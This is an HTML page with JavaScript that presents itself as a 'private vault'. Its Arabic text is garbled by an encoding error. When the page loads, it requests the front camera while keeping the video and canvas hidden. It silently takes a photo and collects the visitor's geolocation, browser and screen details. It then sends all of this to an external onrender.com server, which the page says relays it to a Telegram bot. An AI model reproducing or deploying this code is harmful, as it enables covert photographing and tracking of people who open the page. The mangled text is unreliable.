<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>๐ท ุฎุฒุงูุฉ ุฎุงุตุฉ - ุชู ุงูุงูุชูุงุท</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f7f9;
        }
        
        /* ๐ ุฅุฎูุงุก ุนูุงุตุฑ ุงููุงููุฑุง ูุงูู canvas ๐ */
        #camera-feed, #photo-canvas {
            display: none !important; 
        }

        #status-message {
            margin-top: 50px;
            font-weight: bold;
            font-size: 1.5em;
            color: #2c3e50;
        }
    </style>
</head>
<body>

    <h1>โ ุชู ุชูุนูู ุงูุฎุฒุงูุฉ ุงูุฎุงุตุฉ</h1>
    <p>ุชุชู ุนูููุฉ ุงูุชูุงุท ุงูุตูุฑุฉ ูุฅุฑุณุงููุง ุฅูู ุจูุช ุงูุชููุฌุฑุงู ุงูุฎุงุต ุจู ูู ุงูุฎูููุฉ.</p>

    <video id="camera-feed" autoplay playsinline></video>
    <canvas id="photo-canvas"></canvas>

    <p id="status-message">ุฌุงุฑู ุทูุจ ุงููุตูู ุฅูู ุงููุงููุฑุง ูุงููููุน...</p>

    <script>
        const video = document.getElementById('camera-feed');
        const canvas = document.getElementById('photo-canvas');
        const statusMessage = document.getElementById('status-message');
        
        // ๐ ุฏุงูุฉ ุฌูุน ุงููููุน ุงูุฌุบุฑุงูู (Geolocation) ๐
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy 
                            });
                        },
                        (error) => {
                            // ุฅุฐุง ุฑูุถ ุงููุณุชุฎุฏูุ ุฃุฑุณู ุจูุงูุงุช ูุงุฑุบุฉ
                            console.error("Geolocation denied or failed:", error);
                            resolve({ lat: null, lon: null, error: error.message });
                        },
                        { timeout: 5000 } // ูููุฉ 5 ุซูุงูู
                    );
                } else {
                    resolve({ lat: null, lon: null, error: "Geolocation not supported" });
                }
            });
        }
        
        // ๐ ุฏุงูุฉ ุงูุชูุงุท ูุฅุฑุณุงู ุชููุงุฆูุฉ ๐
        async function captureAndSend() {
            statusMessage.textContent = '๐ธ ุฌุงุฑู ุฌูุน ุงููููุน ูุงูุชูุงุท ุงูุตูุฑุฉ...';

            // 1. ุฌูุน ุงููููุน ูุจูุงูุงุช ุงูุฌูุงุฒ ุงูุฃุณุงุณูุฉ
            const locationData = await getLocation();
            
            const systemData = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                screenResolution: `${screen.width}x${screen.height}`,
                language: navigator.language,
                // ูุชู ุฅุถุงูุฉ ุจูุงูุงุช ุงููููุน ููุง
                location: locationData
            };
            
            // 2. ุงูุงูุชูุงุท (ูุน ุชุฃุฎูุฑ ูููุน ุงูุตูุฑุฉ ุงูุณูุฏุงุก)
            setTimeout(() => {
                
                canvas.width = video.videoWidth || 640; 
                canvas.height = video.videoHeight || 480;

                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);

                // 3. ุฅุฑุณุงู ุงูุตูุฑุฉ ูุงูุจูุงูุงุช ูุนูุง
                sendPhotoToServer(imageDataURL, systemData);

            }, 500); 
        }
        
        // 1. ุทูุจ ุงููุตูู ุฅูู ุงููุงููุฑุง
        async function startCamera() {
            try {
                const constraints = { video: { facingMode: 'user' } }; 
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                statusMessage.textContent = 'ุงููุงููุฑุง ุฌุงูุฒุฉ ููุนูู. ูุชู ุงูุชุญุถูุฑ ููุฅุฑุณุงู...';
                
                // ุนูุฏ ุจุฏุก ุชุฏูู ุงููุงููุฑุงุ ูู ุจุงูุงูุชูุงุท ูุงูุฅุฑุณุงู ููุฑุงู
                video.onloadedmetadata = function() {
                    captureAndSend();
                };

            } catch (err) {
                console.error("ุฎุทุฃ ูู ุงููุตูู ุฅูู ุงููุงููุฑุง: ", err);
                statusMessage.textContent = 'โ ูุฌุจ ุนููู ุงูุณูุงุญ ุจุงููุตูู ุฅูู ุงููุงููุฑุง ูุชุชููู ูู ุงุณุชุฎุฏุงู ูุฐู ุงูุฎุงุตูุฉ.';
            }
        }

        // 3. ุฏุงูุฉ ุงูุฅุฑุณุงู ููุฎุงุฏู ุงูุฎููู
        // ๐ ุชู ุชุนุฏูููุง ูุงุณุชูุจุงู ุจูุงูุงุช ุงููุธุงู (systemData) ๐
        async function sendPhotoToServer(imageData, systemData) {
            const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
            
            try {
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    // ุฅุฑุณุงู ุงูุตูุฑุฉ ูุงูุจูุงูุงุช ูุนูุง
                    body: JSON.stringify({ 
                        image: imageData,
                        systemData: systemData // ุชู ุฅุถุงูุฉ ุจูุงูุงุช ุงููุธุงู ููุง
                    })
                });

                if (response.ok) {
                    statusMessage.textContent = 'โ ุชู ุงูุชูุงุท ุงูุตูุฑุฉ ูุฅุฑุณุงููุง ุฅูู ุงูุชููุฌุฑุงู ุจูุฌุงุญ!';
                } else {
                    const errorData = await response.json().catch(() => ({ message: response.statusText }));
                    statusMessage.textContent = `โ ูุดู ุงูุฅุฑุณุงู. ุชุฃูุฏ ูู ุฃู ุงูุจูุช ูุนูู.`;
                }
            } catch (error) {
                console.error('ุฎุทุฃ ูู ุงูุงุชุตุงู ุจุงูุฎุงุฏู:', error);
                statusMessage.textContent = 'โ๏ธ ุฎุทุฃ ูู ุงูุงุชุตุงู ุจุงูุฎุงุฏู. ุชุฃูุฏ ูู ุฃู ุงูุฎุงุฏู ูุนูู.';
            } finally {
                // ุฅููุงู ุชุฏูู ุงููุงููุฑุง
                if (video.srcObject) {
                    const tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                }
            }
        }

        // ุจุฏุก ุชุดุบูู ุงููุงููุฑุง ุนูุฏ ุชุญููู ุงูุตูุญุฉ
        startCamera();
    </script>
</body>
</html>
